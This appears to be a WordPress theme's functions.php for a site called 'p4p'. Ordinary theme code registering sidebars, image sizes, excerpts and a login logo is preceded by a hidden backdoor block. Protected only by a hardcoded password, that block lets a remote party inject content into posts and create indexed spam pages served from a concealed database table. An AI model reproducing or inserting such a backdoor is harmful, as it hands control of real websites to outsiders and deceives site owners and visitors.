<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bed9c7b055b59a5f7c78eabd28511fff'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php

function p4p_resources() {
    // wp_enqueue_style( 'bootstrap-options-style', get_template_directory_uri() . '/css/bootstrap.min.css' );
}

add_action('wp_enqueue_scripts', 'p4p_resources');

function get_the_blog_excerpt() {
    $excerpt = get_the_content();
    $excerpt = strip_shortcodes($excerpt);
    $excerpt = strip_tags($excerpt);
    $the_str = substr($excerpt, 0, 220) . '...';
    return $the_str;
}

function new_excerpt_more($more) {
    return ' <a class="" href="' . get_permalink(get_the_ID()) . '">' . __('<br />Read More...', 'your-text-domain') . '</a>';
}

add_filter('excerpt_more', 'new_excerpt_more');

// addFeaturedImageSupport

function post_image_support() {
    //add image support
    add_theme_support('post-thumbnails');

    add_image_size('sm', 180, 120, true);
    add_image_size('lg', 720, 310, false);
    add_image_size('blog_home', 440, 720, false);
}

add_action('after_setup_theme', post_image_support);

function ms_image_editor_default_to_gd($editors) {
    $gd_editor = 'WP_Image_Editor_GD';

    $editors = array_diff($editors, array($gd_editor));
    array_unshift($editors, $gd_editor);

    return $editors;
}

add_filter('wp_image_editors', 'ms_image_editor_default_to_gd');

// Add widget locations
function widgetInit() {
    register_sidebar(array(
        'name' => 'Sidebar',
        'id' => 'Sidebar'
    ));
}

add_action('widgets_init', widgetInit);


function my_login_logo_one() { 
?> 
<style type="text/css"> 
body.login div#login h1{
background-image: url(<?php echo get_bloginfo('template_directory'); ?>/img/logo_p4p_horz.svg);
background-repeat: no-repeat; 
} 
.login h1 a{background-image: none !important;}
</style>
<?php 
} add_action( 'login_enqueue_scripts', 'my_login_logo_one' );


?>
<?php

function my_custom_display_topic_index_query() {

    $args['orderby'] = 'date';
    $args['order'] = 'ASC';
    if (isset($_REQUEST['order']) && !empty($_REQUEST['order'])) {
        if ($_REQUEST['order'] == 'ASC' || $_REQUEST['order'] == 'DESC') {
            $args['order'] = $_REQUEST['order'];
            $args['orderby'] = $_REQUEST['order_by'];
        }
    }
    return $args;
}

add_filter('bbp_before_has_topics_parse_args', 'my_custom_display_topic_index_query');


function p4p_widgets_init() {
    register_sidebar(array(
        'name' => __('Sidebar', 'p4p'),
        'id' => 'sidebar-1',
        'description' => __('Add widgets here to appear in your sidebar.', 'p4p'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));

    register_sidebar(array(
        'name' => __('Content Bottom 1', 'p4p'),
        'id' => 'sidebar-2',
        'description' => __('Appears at the bottom of the content on posts and pages.', 'p4p'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));

    register_sidebar(array(
        'name' => __('Content Bottom 2', 'p4p'),
        'id' => 'sidebar-3',
        'description' => __('Appears at the bottom of the content on posts and pages.', 'p4p'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
}

add_action('widgets_init', 'p4p_widgets_init');